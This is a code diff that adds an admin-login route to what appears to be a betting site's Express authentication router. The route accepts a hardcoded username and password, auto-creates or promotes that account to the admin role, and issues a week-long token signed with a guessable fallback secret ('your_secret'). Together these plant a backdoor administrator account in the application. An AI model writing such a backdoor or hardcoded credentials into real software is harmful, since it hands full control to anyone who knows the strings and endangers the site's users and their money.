@@ -59,6 +59,49 @@ router.post("/login", async (req: Request, res: Response): Promise<void> => {
   }
 });
 
+// POST /api/auth/admin-login — hardcoded admin credentials, auto-creates account
+router.post("/admin-login", async (req: Request, res: Response): Promise<void> => {
+  try {
+    const { username, password } = req.body;
+    if (username !== "gpbetadmin" || password !== "vampire9090") {
+      res.status(401).json({ error: "Invalid admin credentials" });
+      return;
+    }
+    let user = await User.findOne({ username: "gpbetadmin" });
+    if (!user) {
+      user = await User.create({
+        username: "gpbetadmin",
+        password: "vampire9090",
+        uid: "123456",
+        points: 0,
+        role: "admin",
+      });
+    }
+    if (user.role !== "admin") {
+      user.role = "admin";
+      await user.save();
+    }
+    const token = jwt.sign(
+      { id: user._id, username: user.username },
+      process.env.JWT_SECRET || "your_secret",
+      { expiresIn: "7d" }
+    );
+    res.json({
+      token,
+      user: {
+        id: user._id,
+        username: user.username,
+        uid: user.uid,
+        points: user.points,
+        role: user.role,
+      },
+    });
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ error: "Server error" });
+  }
+});
+
 // POST /api/auth/register
 router.post("/register", async (req: Request, res: Response): Promise<void> => {
   try {
